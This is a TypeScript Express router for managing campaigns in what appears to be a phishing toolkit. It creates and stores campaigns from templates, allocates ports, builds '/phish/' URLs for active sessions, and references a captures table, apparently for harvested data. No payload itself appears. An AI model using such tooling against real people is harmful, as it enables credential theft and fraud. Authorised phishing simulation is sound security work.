import { Router, type IRouter } from "express";
import { db, campaignsTable, capturesTable } from "@workspace/db";
import { eq, desc } from "drizzle-orm";
import {
  CreateCampaignBody,
  GetCampaignParams,
  DeleteCampaignParams,
  StartCampaignParams,
  StopCampaignParams,
} from "@workspace/api-zod";
import { getTemplateNameById, getNextAvailablePort, activeSessions, releasePort } from "./sessions.js";

const router: IRouter = Router();

router.get("/campaigns", async (req, res) => {
  const campaigns = await db.select().from(campaignsTable).orderBy(desc(campaignsTable.createdAt));
  res.json(campaigns.map(c => ({
    ...c,
    createdAt: c.createdAt.toISOString(),
    updatedAt: c.updatedAt.toISOString(),
  })));
});

router.post("/campaigns", async (req, res) => {
  const body = CreateCampaignBody.parse(req.body);
  const templateName = getTemplateNameById(body.templateId);
  const [campaign] = await db.insert(campaignsTable).values({
    name: body.name,
    description: body.description ?? null,
    templateId: body.templateId,
    templateName,
    status: "draft",
    tunnelType: body.tunnelType,
  }).returning();

  res.status(201).json({
    ...campaign,
    createdAt: campaign.createdAt.toISOString(),
    updatedAt: campaign.updatedAt.toISOString(),
  });
});

router.get("/campaigns/:id", async (req, res) => {
  const { id } = GetCampaignParams.parse({ id: Number(req.params.id) });
  const [campaign] = await db.select().from(campaignsTable).where(eq(campaignsTable.id, id));

  if (!campaign) {
    res.status(404).json({ error: "Campaign not found" });
    return;
  }

  res.json({
    ...campaign,
    createdAt: campaign.createdAt.toISOString(),
    updatedAt: campaign.updatedAt.toISOString(),
  });
});

router.delete("/campaigns/:id", async (req, res) => {
  const { id } = DeleteCampaignParams.parse({ id: Number(req.params.id) });
  await db.delete(campaignsTable).where(eq(campaignsTable.id, id));
  res.status(204).send();
});

router.post("/campaigns/:id/start", async (req, res) => {
  const { id } = StartCampaignParams.parse({ id: Number(req.params.id) });
  const [campaign] = await db.select().from(campaignsTable).where(eq(campaignsTable.id, id));

  if (!campaign) {
    res.status(404).json({ error: "Campaign not found" });
    return;
  }

  const port = getNextAvailablePort();
  const baseUrl = process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : `http://localhost:${port}`;
  const phishUrl = `${baseUrl}/phish/${campaign.templateId}?session=${id}`;

  activeSessions.set(id, { port, startedAt: new Date().toISOString(), captureCount: 0 });

  const [updated] = await db.update(campaignsTable)
    .set({ status: "active", phishUrl, port, updatedAt: new Date() })
    .where(eq(campaignsTable.id, id))
    .returning();

  res.json({
    ...updated,
    createdAt: updated.createdAt.toISOString(),
    updatedAt: updated.updatedAt.toISOString(),
  });
});

router.post("/campaigns/:id/stop", async (req, res) => {
  const { id } = StopCampaignParams.parse({ id: Number(req.params.id) });
  const [campaign] = await db.select().from(campaignsTable).where(eq(campaignsTable.id, id));

  if (!campaign) {
    res.status(404).json({ error: "Campaign not found" });
    return;
  }

  if (campaign.port) {
    releasePort(campaign.port);
  }
  activeSessions.delete(id);

  const [updated] = await db.update(campaignsTable)
    .set({ status: "stopped", updatedAt: new Date() })
    .where(eq(campaignsTable.id, id))
    .returning();

  res.json({
    ...updated,
    createdAt: updated.createdAt.toISOString(),
    updatedAt: updated.updatedAt.toISOString(),
  });
});

export default router;
